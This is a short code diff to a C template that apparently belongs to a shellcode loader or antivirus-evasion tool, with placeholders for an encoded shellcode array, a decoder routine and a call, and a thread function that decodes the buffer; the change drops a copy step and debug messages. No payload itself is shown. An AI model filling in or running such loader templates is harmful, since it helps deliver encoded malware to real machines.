@@ -10,7 +10,7 @@
 
 //####CODE####
 
-const unsigned char raw[####SHELLCODE_LEN####] = ####SHELLCODE####;
+unsigned char encoded[####SHELLCODE_LEN####] = ####SHELLCODE####;
 int length = ####SHELLCODE_LEN####;
 
 DWORD WINAPI esc_main(LPVOID lpParameter)
@@ -18,15 +18,6 @@ DWORD WINAPI esc_main(LPVOID lpParameter)
     DWORD dwSize;
     bool success = false;
     
-    printf("[-] length is %d !\n", length);
-
-    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
-    success = memcpy(encoded, raw, length);
-        if (!success){
-        printf("[-] Oh gosh, something went wrong!\n");
-        return -2;
-    }
-
     //####CALL####
 
     unsigned char* decoded = encoded;
